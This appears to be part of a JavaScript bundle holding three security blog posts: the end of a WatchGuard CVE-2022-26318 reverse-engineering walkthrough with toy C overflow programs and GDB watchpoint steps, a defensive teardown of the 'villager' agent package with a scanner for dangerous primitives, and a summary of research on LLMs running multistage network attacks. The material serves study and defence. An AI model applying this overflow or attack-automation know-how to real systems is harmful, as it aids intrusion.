    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,OS=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
<h1>Villager, Inside Out: FastAPI control plane + LLM task graph + MCP tool runner (with code)</h1>
<blockquote>
<p><strong>Scope &amp; intent:</strong> This is a <strong>defender‑focused technical teardown</strong> of the Python package <strong><code>villager</code></strong> (latest pre‑release commonly referenced: <strong>0.2.1rc1</strong>). The goal is to understand <strong>architecture and risk</strong>, not to enable abuse. Use only in authorized environments.</p>
<p>This blog uses publicly available package metadata (PyPI), a reverse‑engineered GitHub mirror intended “for analysis,” and MCP documentation to explain how the moving parts fit together.</p>
</blockquote>
<hr />
<h2>0) Why Villager is interesting</h2>
<p>Villager is positioned as an “experimental technology project” on PyPI, shipped as a Python package with dependencies that look like a typical <strong>agent stack</strong> (FastAPI, Typer, LangChain, OpenAI client libs, MCP/FastMCP, etc.).</p>
<p>At a high level it resembles a common “agentic automation” pattern:</p>
<ul>
<li>a <strong>web API</strong> to submit work,</li>
<li>an <strong>LLM planner/judge</strong> loop to decide steps and completion,</li>
<li>and a <strong>tool bridge</strong> (MCP) to execute actions in external systems.</li>
</ul>
<p>This architecture is the important part: agentic orchestration changes your risk model because <strong>any tool exposed to the agent becomes part of the agent’s attack surface</strong>.</p>
<hr />
<h2>1) The big picture architecture</h2>
<h3>The layers</h3>
<ol>
<li>
<p><strong>Interface layer (FastAPI + CLI)</strong><br />
   A server exposes endpoints like “create task,” “get status,” “get tree,” “stop task,” “get context.”</p>
</li>
<li>
<p><strong>Scheduler layer (task nodes + branching)</strong><br />
   A task is represented as a node in a <strong>task graph/tree</strong>, which may branch into subtasks based on LLM output.</p>
</li>
<li>
<p><strong>Execution layer (MCP client)</strong><br />
   The “hands” are not inside Villager itself; instead it calls <strong>MCP servers</strong> (e.g., browser automation, a controlled environment runner, etc.).</p>
</li>
<li>
<p><strong>(Optional) Local tool-call layer</strong><br />
   Many agent frameworks also implement internal tool execution (e.g., “call a function by name with JSON args”). In Villager-like systems, this is where risk spikes if the tool set includes <code>subprocess</code> or <code>eval</code> primitives.</p>
</li>
</ol>
<h3>Request lifecycle (conceptual flow)</h3>
<pre><code class="language-text">Client
  |
  |  POST /task   (abstract, description, verification)
  v
FastAPI app
  |
  |  creates TaskNode and runs it in background
  v
TaskNode.execute()
  |
  |-- (branching?) -&gt; create child TaskNodes and execute them
  |
  |-- else -&gt; run_mcp_agent() -&gt; McpClient.execute(prompt)
  |
  |-- judge step -&gt; DONE / TURNING / IMPOSSIBLE (repeat or stop)
  v
Client polls:
  - status
  - task tree
  - context transcript
</code></pre>
<hr />
<h2>2) What MCP is and why it’s central here</h2>
<p><strong>MCP (Model Context Protocol)</strong> is an open protocol for connecting LLM applications to external tools and data sources through a standardized interface. It defines a host/client/server model and protocol semantics. (Think: a “universal adapter” for tools.)</p>
<p>Villager uses MCP to separate the orchestrator from the actual tool execution environment. This is a big deal:</p>
<ul>
<li>It enables powerful workflows without bundling tools inside the package.</li>
<li>It also means the orchestrator can become a “universal remote” for anything the MCP servers expose.</li>
</ul>
<hr />
<h2>3) The API control plane (FastAPI)</h2>
<p>This is the “front door” pattern seen in many agent frameworks:</p>
<ul>
<li>submit a task,</li>
<li>poll its status,</li>
<li>fetch the task tree/graph,</li>
<li>fetch the transcript/context,</li>
<li>stop/interrupt execution.</li>
</ul>
<h3>Example client requests (generic)</h3>
<pre><code class="language-bash"># create a task (example: innocuous compliance doc generation)
curl -s -X POST &quot;http://127.0.0.1:37695/task&quot;   -H &quot;Content-Type: application/json&quot;   -d '{
    &quot;abstract&quot;: &quot;Summarize our incident response runbook&quot;,
    &quot;description&quot;: &quot;Use only our internal documents. Output Markdown.&quot;,
    &quot;verification&quot;: &quot;Includes owners, escalation flow, and contact matrix.&quot;
  }'

# poll status
curl -s &quot;http://127.0.0.1:37695/get/task/status?task_id=&lt;TASK_ID&gt;&quot;

# fetch graph/tree
curl -s &quot;http://127.0.0.1:37695/task/&lt;TASK_ID&gt;/tree&quot;

# fetch context transcript
curl -s &quot;http://127.0.0.1:37695/task/&lt;TASK_ID&gt;/context&quot;
</code></pre>
<blockquote>
<p><strong>Engineering note:</strong> In prototype designs like this, tasks are often stored in memory (a module‑level dict). In production you’d persist tasks in Redis/DB and make IDs per request.</p>
</blockquote>
<hr />
<h2>4) TaskNode: the planner / executor / judge loop</h2>
<p>The core idea is a controller loop like:</p>
<p>1) Ask the LLM: <strong>Should I break this into subtasks?</strong><br />
2) If yes: create subtasks and run them.<br />
3) If no: run a “do work” step via tools/MCP.<br />
4) Ask the LLM: <strong>Is it done?</strong><br />
5) If not: iterate until max retries or failure.</p>
<h3>Pseudocode you can recognize in many agent codebases</h3>
<pre><code class="language-python">class TaskNode:
    def execute(self):
        self.status = &quot;PROCESSING&quot;

        branch = self.llm_should_branch(self.abstract, self.description)
        if branch.need_branching:
            self.children = [TaskNode(t) for t in branch.tasks]
            for child in self.children:
                child.execute()

        output = self.run_mcp_agent()
        verdict = self.llm_judge(output, self.verification)

        if verdict == &quot;DONE&quot;:
            self.status = &quot;DONE&quot;
            return output
        elif verdict == &quot;TURNING&quot;:
            return self.retry_loop()
        else:
            self.status = &quot;IMPOSSIBLE&quot;
            return output
</code></pre>
<p>This <strong>pattern</strong> is what matters, even if variable names differ.</p>
<hr />
<h2>5) MCP client: streaming tool execution</h2>
<p>A common MCP gateway pattern is:</p>
<ul>
<li>send a request (prompt + config),</li>
<li>consume a stream (SSE / newline‑delimited JSON),</li>
<li>keep a transcript of messages and tool results.</li>
</ul>
<h3>Toy MCP streaming consumer (safe example)</h3>
<pre><code class="language-python">import json
import requests

def stream_mcp(base_url: str, payload: dict) -&gt; str:
    &quot;&quot;&quot;
    Safe-to-read example of how an HTTP streaming MCP-like gateway might be consumed.
    (Exact endpoints and schemas vary by implementation.)
    &quot;&quot;&quot;
    out = []
    with requests.post(base_url, json=payload, stream=True, timeout=60) as r:
        r.raise_for_status()
        for line in r.iter_lines(decode_unicode=True):
            if not line:
                continue
            evt = json.loads(line)
            if evt.get(&quot;content&quot;):
                out.append(evt[&quot;content&quot;])
            if evt.get(&quot;done&quot;):
                break
    return &quot;&quot;.join(out)
</code></pre>
<p><strong>Why defenders care:</strong> once this is wired to real tool servers, the orchestrator can cause real-world side effects. Your security posture becomes “how safe are the MCP servers, and how tight is authz?”</p>
<hr />
<h2>6) The “in-band tool call” pattern (%%{json}%%)</h2>
<p>Some agent frameworks support tool calls by asking the model to emit a JSON blob in the middle of text, e.g.:</p>
<pre><code class="language-text">%%{&quot;name&quot;:&quot;SearchFastMcp&quot;,&quot;parameters&quot;:{&quot;query&quot;:&quot;auth&quot;}}%%
</code></pre>
<p>Then code extracts the JSON and runs the corresponding function.</p>
<h3>Minimal parser + allowlist executor (safe pattern)</h3>
<pre><code class="language-python">import json, re
from typing import Any, Callable

TOOL_RX = re.compile(r&quot;%%\\s*(\\{.*?\\})\\s*%%&quot;, re.DOTALL)

def extract_tool_calls(text: str) -&gt; list[dict]:
    calls = []
    for m in TOOL_RX.finditer(text):
        calls.append(json.loads(m.group(1)))
    return calls

def run_tools(calls: list[dict], registry: dict[str, Callable[..., Any]]):
    results = []
    for c in calls:
        name = c.get(&quot;name&quot;)
        args = c.get(&quot;parameters&quot;) or {}
        if name not in registry:
            raise ValueError(f&quot;Tool not allowed: {name}&quot;)
        results.append(registry[name](**args))
    return results
</code></pre>
<p><strong>Defender takeaway:</strong> the parser is not scary; the <strong>tool registry</strong> is. If the registry includes shell execution, file access, credential access, network scanning, etc., the system must be treated like privileged code.</p>
<hr />
<h2>7) The reverse-engineered mirror’s warning: “callbacks” and data egress</h2>
<p>The GitHub mirror you referenced was created “for analysis” and explicitly warns about multiple potential egress paths (proxying and webhooks).</p>
<p>Even if you never “use those tools,” defenders should assume:</p>
<ul>
<li>imports can have side effects,</li>
<li>configuration drift happens,</li>
<li>agents sometimes “discover” and call tools you forgot existed.</li>
</ul>
<p><strong>Rule of thumb:</strong> if it can talk to the network, it can leak data—unless you lock down egress.</p>
<hr />
<h2>8) How to analyze Villager-like packages safely (with code)</h2>
<h3>A) Pin exact artifacts and verify hashes</h3>
<p>1) Download wheels/sdists without executing code.
2) Verify file hashes against the package index metadata.</p>
<pre><code class="language-bash">pip download --no-deps villager==0.2.1rc1
sha256sum villager-0.2.1rc1*.tar.gz villager-0.2.1rc1*.whl
</code></pre>
<h3>B) Static scan for dangerous primitives</h3>
<pre><code class="language-python"># static_scan.py
import pathlib, re

ROOT = pathlib.Path(&quot;.&quot;)  # point at the extracted sdist folder
PATTERNS = {
    &quot;network&quot;: re.compile(r&quot;\\b(requests|httpx|urllib3|socket)\\b&quot;),
    &quot;process&quot;: re.compile(r&quot;\\b(subprocess\\.run|Popen|os\\.system)\\b&quot;),
    &quot;eval_exec&quot;: re.compile(r&quot;\\b(eval|exec)\\b&quot;),
    &quot;secrets&quot;: re.compile(r&quot;\\b(api[_-]?key|token|secret|passwd|password)\\b&quot;, re.I),
}

hits = {k: [] for k in PATTERNS}
for py in ROOT.rglob(&quot;*.py&quot;):
    s = py.read_text(errors=&quot;ignore&quot;)
    for k, rx in PATTERNS.items():
        if rx.search(s):
            hits[k].append(str(py))

for k, files in hits.items():
    print(f&quot;\\n[{k}] {len(files)} files&quot;)
    for f in files[:40]:
        print(&quot; &quot;, f)
</code></pre>
<h3>C) If you must execute: isolate hard</h3>
<ul>
<li>run in a throwaway VM/container</li>
<li>no host mounts (<code>~/.ssh</code>, cloud creds, browser profiles)</li>
<li>run unprivileged user</li>
<li><strong>block outbound network</strong> except to a controlled MCP server</li>
<li>record egress (pcap) for validation</li>
</ul>
<hr />
<h2>9) Building a safer “Villager-like” system (recommended hardening)</h2>
<p>If you’re rebuilding this idea (and you probably should, instead of installing unknown packages):</p>
<p>1) <strong>Separate “planner” from “executor”</strong> with clear boundaries<br />
2) <strong>Never expose “danger primitives”</strong> (shell, eval) directly to the model<br />
3) <strong>Use structured tool calling</strong> (strict JSON schema, validation, allowlists)<br />
4) <strong>Implement per-tool authz</strong> (who can call what, with what parameters)<br />
5) <strong>Add an audit trail</strong> (tool called, args, time, outcome; redact secrets)<br />
6) <strong>Default-deny egress</strong> and require explicit network allowlists<br />
7) <strong>Make tasks durable</strong> (DB/queue), enforce per-request UUIDs, add auth to API</p>
<hr />
<h2>10) References</h2>
<ul>
<li>PyPI: https://pypi.org/project/villager/</li>
<li>GitHub mirror (“for analysis”): https://github.com/gregcmartin/villager</li>
<li>MCP (official): https://modelcontextprotocol.io/</li>
<li>MCP spec (dated): https://modelcontextprotocol.io/specification/2025-11-25</li>
<li>FastMCP docs: https://gofastmcp.com/</li>
<li>FastMCP repo: https://github.com/jlowin/fastmcp</li>
</ul>
  </div>
</body>
</html>
`,FS=`<h1>On the Feasibility of Using LLMs to Execute Multistage Network Attacks – A Technical Breakdown</h1>
<p>Can large language models (LLMs) autonomously conduct complex multi-host cyberattacks? This is the central question addressed by <em>“On the Feasibility of Using LLMs to Execute Multistage Network Attacks.”</em> The paper explores whether state-of-the-art LLMs can perform full multistage network attacks – the kind of realistic attacks that involve multiple phases (reconnaissance, exploitation, lateral movement, privilege escalation, data exfiltration) across multiple hosts. Such attacks reflect real-world breaches (e.g., the Equifax data breach or Colonial Pipeline attack) and are the bread-and-butter of red team exercises and nation-state hacking campaigns. The motivation is clear: if LLMs could execute these attacks autonomously, it could revolutionize red-teaming by augmenting or automating the work of human security testers, allowing defenders to proactively find gaps in their defenses. This technical blog delves into the paper’s contributions – from the evaluation setup and failure analysis to the proposed <strong>Incalmo</strong> framework – providing an objective, detailed breakdown for security researchers.</p>
<hr />
<h2>Evaluation Setup: 10 Multi-Host Environments, LLMs, and Baselines</h2>
<p>To systematically study LLM-driven attacks, the authors built <strong>10 realistic multistage attack environments</strong> (25–50 hosts each) and evaluated several leading LLMs and a baseline system. Each environment is a contained network with a specific scenario and goal (usually to exfiltrate sensitive data from target hosts). The environments include both real breach recreations and synthetic network topologies:</p>
<ul>
<li><strong>Equifax-inspired (50 hosts):</strong> Replica of the Equifax corporate network (as described in breach reports) with known vulnerable services; goal is to exfiltrate all critical data.</li>
<li><strong>Colonial Pipeline-inspired (45 hosts):</strong> An IT/OT network based on the pipeline attack, with two IT subnets and an OT subnet controlling physical devices; goal is to gain control of OT hosts (industrial control systems).</li>
<li><strong>Enterprise A (30 hosts):</strong> A three-tier enterprise network (web server subnet, employee subnet, database subnet); goal is to exfiltrate all sensitive database data.</li>
<li><strong>Enterprise B (40 hosts):</strong> Similar to Enterprise A but larger (four subnets) and requiring more exploits to reach the data; goal is again to exfiltrate all critical data.</li>
<li><strong>4-Layer Chain (25 hosts):</strong> A linear “stepping-stone” chain where each compromised host yields credentials to the next host; each host stores a secret file. Goal is to exfiltrate all files from the chain.</li>
<li><strong>6-Layer Chain (25 hosts):</strong> A harder variant of the chain topology – each hop requires a privilege escalation on the host to access the file (each host has a random privilege-escalation vulnerability).</li>
<li><strong>4-Layer Star (25 hosts):</strong> A single network with many hosts, each vulnerable to some remote code execution. The attacker can directly reach all hosts (star topology); goal is to exfiltrate each host’s critical data.</li>
<li><strong>6-Layer Star (25 hosts):</strong> A tougher star scenario – each host’s data requires privilege escalation and hosts have random privilege-escalation bugs.</li>
<li><strong>Dumbbell A (30 hosts):</strong> Two subnetworks (“dumbbell” shape): one with externally accessible web servers, and one with internal databases. Each web server holds credentials for a specific database. Goal is to use the credentials to compromise databases and exfiltrate data.</li>
<li><strong>Dumbbell B (30 hosts):</strong> Similar to Dumbbell A but adding complexity: database access and data retrieval require elevated privileges (mimicking stricter internal security).</li>
</ul>
<p>These environments were crafted to be realistic and diverse. Two are modeled on real incidents (Equifax and Colonial Pipeline), others on common enterprise designs, and some on topologies from prior research. This provides a thorough testbed for LLMs’ offensive capabilities.</p>
<h3>Evaluated LLMs</h3>
<p>The authors tested six advanced LLMs (from multiple organizations) under code names:</p>
<ul>
<li><strong>Sonnet 3.5</strong></li>
<li><strong>Haiku 3.5</strong></li>
<li><strong>GPT-4o</strong></li>
<li><strong>GPT-4o mini</strong></li>
<li><strong>Gemini 1.5 Pro</strong></li>
<li><strong>Gemini 1.5 Flash</strong></li>
</ul>
<p>These represent models of various sizes and capabilities. By evaluating multiple LLMs, the study can identify whether failures are model-specific or common to the state of the art.</p>
<h3>Baseline – PentestGPT</h3>
<p>In addition to fully-autonomous LLM agents, the paper compares against <strong>PentestGPT</strong>, a human-in-the-loop penetration testing assistant (USENIX Security 2024). PentestGPT uses prompting techniques to guide a human operator in CTF-style tasks. It suggests actions and commands which a human then executes and feeds back results. To test it in this setting, the authors ran PentestGPT on the same 10 scenarios by manually acting as the human operator (entering its recommended commands into the attacker machine). They ensured a fair comparison by only executing concrete commands provided by PentestGPT (if it gave only high-level ideas, they asked it once for a specific command). This tests whether state-of-the-art prompt engineering and human guidance (PentestGPT’s approach) fares better than a fully autonomous LLM agent.</p>
<h3>Success criteria</h3>
<p>An LLM “fully succeeds” in an environment if it achieves <strong>all</strong> attack goals (e.g., exfiltrating all target files or compromising all key hosts), whereas “partial success” means achieving at least one goal (e.g., exfiltrating one critical file out of many).</p>
<p>Using this metric, the initial evaluation was sobering:</p>
<ul>
<li><strong>None</strong> of the LLMs, on their own, could fully complete any of the 10 multistage attacks.</li>
<li>Across 50 trials (5 trials per LLM per environment), there was only <strong>one</strong> instance of even partial success – the model <strong>Sonnet 3.5</strong> managed to exfiltrate a single file (out of 25) in the <strong>4-Layer Chain</strong> scenario.</li>
<li>The human-assisted PentestGPT baseline did no better: <strong>PentestGPT did not manage to achieve even a partial objective in any environment</strong>.</li>
</ul>
<p>In other words, even with state-of-the-art prompting and a human in the loop, the multistage attacks remained unsolved. The only relatively consistent capability LLMs demonstrated was basic reconnaissance (e.g., scanning for hosts/services) – beyond that, they became stuck or made fatal errors.</p>
<p>These results confirmed that multihost, multiphase attacks are a steep challenge for current LLMs, motivating a deeper investigation into why they failed.</p>
<hr />
<h2>Why LLMs Struggle: Attack Graph Failure Analysis</h2>
<p>To understand the failure modes of the LLM “attackers,” the researchers turned to a classic formalism in cybersecurity: <strong>attack graphs</strong>. An attack graph models the possible states an attacker can achieve in the network (nodes) and the actions (edges) that transition between states, ultimately leading to the goal.</p>
<p>For example:</p>
<ul>
<li>Intermediate states might include “gained user access on web server” or “discovered database credentials.”</li>
<li>Edges might represent actions like “exploit web server vulnerability” or “use stolen credentials to log into database.”</li>
</ul>
<p>The team constructed ideal attack graphs for each environment (the Equifax-inspired network’s graph had <strong>246</strong> unique states and <strong>48</strong> goal states, for instance). This gave a ground truth reference of what steps are needed to succeed.</p>
<p>They then mapped the logs of each LLM trial onto the attack graph to see which states the LLM managed to reach and which actions it attempted. This mapping was done via heuristics (e.g., scanning command outputs for evidence that a certain host was found or a certain exploit succeeded).</p>
<h3>What the attack graph analysis revealed</h3>
<p>Across all environments, LLMs only achieved between <strong>1% and 30%</strong> of the attack states – a very low coverage of the necessary steps.</p>
<p>Where did things go wrong? The failures generally fell into two broad categories:</p>
<ol>
<li>
<p><strong>Irrelevant commands (off-path actions):</strong> The LLM often issued commands that had no chance of advancing the attack given the actual environment – in attack graph terms, these commands did not correspond to any useful edge or state. In other words, the LLM was wasting efforts on irrelevant or impossible actions. For example, an LLM might try to use a tool like <code>hydra</code> to brute-force SSH passwords on a host, even though the scenario did not support any password authentication vulnerability (no such weakness existed in the environment). Attempts to “find misconfigured files” on a host that had none, or to exploit services that weren’t actually vulnerable, are other examples of these irrelevant actions. This was a prevalent failure mode: depending on the scenario, <strong>28% to 81%</strong> of the commands issued by LLMs were irrelevant to the true attack path. Such detours not only fail to make progress, but can consume the LLM’s budget of steps or trigger defenses if this were a real system.</p>
</li>
<li>
<p><strong>Incorrectly implemented commands (execution errors):</strong> Even when the LLM chose a relevant action toward the goal, it often executed it incorrectly – using a wrong syntax, tool, or parameter that caused the attempt to fail. For instance, the LLM might recognize that it needs to scan the network, but issue an <code>nmap</code> command with wrong flags or an incorrect IP range, yielding no useful result. Or it might attempt to exploit a known CVE but misconfigure the exploit payload. These “right idea, wrong execution” cases were also common: roughly <strong>9% to 32%</strong> of the commands were relevant steps but implemented incorrectly, according to the analysis. An incorrectly crafted command means the attacker fails to achieve the intended state (even though that state was reachable if the command were done properly).</p>
</li>
</ol>
<p>Crucially, these failure modes reinforce each other in a multistage context. Irrelevant actions squander time and lead the LLM down blind alleys, and execution mistakes prevent progress on the correct path – both result in the agent getting stuck well before completing the attack.</p>
<p>The attack graph perspective made these failure patterns clear, highlighting that LLMs lack reliable strategic focus (they try actions not in the attack plan) and precise low-level execution skills. Prior anecdotal observations suggested LLM agents “have good ideas but execute them poorly” and sometimes “fail to pivot when a strategy fails”; this study formalized that insight.</p>
<p>With this understanding, the authors set out to address the root causes: how to keep the LLM focused on relevant actions and help it properly carry out complex steps.</p>
<hr />
<h2>Introducing Incalmo: High-Level Attack Planning for LLMs</h2>
<p>To overcome these failure modes, the paper proposes <strong>Incalmo</strong>, an intervention layer that sits between the LLM and the target environment.</p>
<h3>Core idea</h3>
<p>Instead of having the LLM directly issue raw shell commands to execute the attack, the LLM outputs higher-level <strong>intentions</strong> (tasks), which Incalmo then handles by executing appropriate low-level actions. By mediating and structuring the LLM’s actions, Incalmo aims to prevent irrelevant or malformed commands from derailing the attack.</p>
<h3>Incalmo’s high-level architecture</h3>
<p>Rather than directly running shell commands (baseline), the LLM provides high-level task directives to Incalmo. Incalmo’s components translate those tasks into the appropriate low-level tool commands (nmap, Metasploit, etc.) and feed results back to the LLM.</p>
<h3>Incalmo’s three main components</h3>
<ul>
<li>
<p><strong>Action Planner:</strong> This module presents the LLM with a set of supported high-level attack tasks (declarative actions like “scan the network,” “infect a host,” “find sensitive files,” “exfiltrate data,” etc.). Instead of relying on the LLM to generate correct Bash commands or Metasploit syntax from scratch, the LLM can choose a high-level task and parameters, and the action planner will translate it into a sequence of low-level commands using a predefined library of attack primitives. By handling the implementation details, the action planner minimizes the risk of incorrect command usage – the LLM no longer needs to remember exact tool flags or syntax for complex actions. This directly tackles the “incorrectly implemented command” failure mode.</p>
</li>
<li>
<p><strong>Attack Graph Service:</strong> To address the issue of irrelevant actions, Incalmo provides an attack graph service that the LLM (and the action planner) can query for guidance. This service encodes knowledge of the logical attack graph of the scenario – essentially, it knows which high-level actions are likely productive given the attacker’s current state. The LLM can use it to ask questions like “what could I do next that leads toward the goal?” or to verify whether a certain host is known to be vulnerable before attempting an exploit. In practice, this means the LLM’s choice of tasks can be informed by the structure of the attack graph, helping it avoid irrelevant commands that don’t map to any viable path forward. (The attack graph service can be thought of as an expert system that keeps the LLM on strategy.)</p>
</li>
<li>
<p><strong>Environment State Service:</strong> This component acts as the LLM’s memory and context for the specific environment. It stores all currently known information about the network state – discovered host IPs, open ports, credentials found, compromised accounts, etc. – as the attack progresses. The LLM can query this state to avoid redundancy and configure tasks correctly. For example, before scanning, the LLM can retrieve the IP range of the network; before trying default credentials, it can check if any credentials have already been found. The environment service ensures commands are tailored to the actual environment details (preventing mistakes like scanning the wrong subnet) and that the LLM always has up-to-date facts about what it has accomplished so far. This makes the attack execution more reliable and environment-agnostic, since the LLM doesn’t have to hard-code environment specifics.</p>
</li>
</ul>
